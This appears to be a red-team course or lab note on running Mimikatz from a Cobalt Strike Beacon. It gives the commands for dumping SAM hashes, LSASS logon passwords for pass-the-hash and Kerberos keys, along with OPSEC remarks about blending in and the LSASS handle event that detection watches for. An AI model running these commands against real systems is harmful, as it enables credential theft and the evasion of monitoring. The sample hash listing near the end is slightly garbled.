

Cannot run multiple commands like in console:

``PS C:\Tools\mimikatz\x64> .\mimikatz.exe token::elevate lsadump::sam exit``

Instead use :

`!` to elevate privilege
`@` impersonate Beacon's thread token before running the command

`@` option is useful in cases where Mimikatz needs to interact with a remote system, such as with dcsync.

So in the example above, the correct Cobalt Strike syntax would be:

``beacon> mimikatz !lsadump::sam``


## NTLM Hashes

Dump passwords from memory, even plaintext sometimes. Useful for **Pass the Hash**

```
mimikatz !sekurlsa::logonpasswords
```

Cobalt Strike also has a short-hand command for this called `logonpasswords`.  After dumping these credentials, go to _View > Credentials_ to see a copy of them

Dump the Kerberos encryption keys of currently logged on users, it's more common to use Kerberos in modern systems so we can blend in easier.  These keys can be used in a variety of Kerberos abuse scenarios.

```
mimikatz !sekurlsa::ekeys
```

> [!info] 
> There is a [known issue](https://github.com/gentilkiwi/mimikatz/issues/314) where Mimikatz may incorrectly label all of the hashes as `des_cbc_md4`.
> The order is :
> 
> ```
aes256_hmac       4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6
rc4_hmac_nt       59fc0f884922b4ce376051134c71e22c
rc4_hmac_old      59fc0f884922b4ce376051134c71e22c
rc4_md4           59fc0f884922b4ce376051134c71e22c
rc4_hmac_nt_exp   59fc0f884922b4ce376051134c71e22c
rc4_hmac_old_exp  59fc0f884922b4ce376051134c71e22c2c




> [!warning] 
> Requires elevated privileges.

> [!danger] 
> OPSEC: This modules will open a read handle to LSASS which can be logged under event 4656. Use the "Suspicious Handle to LSASS" saved search in Kibana to see them. 

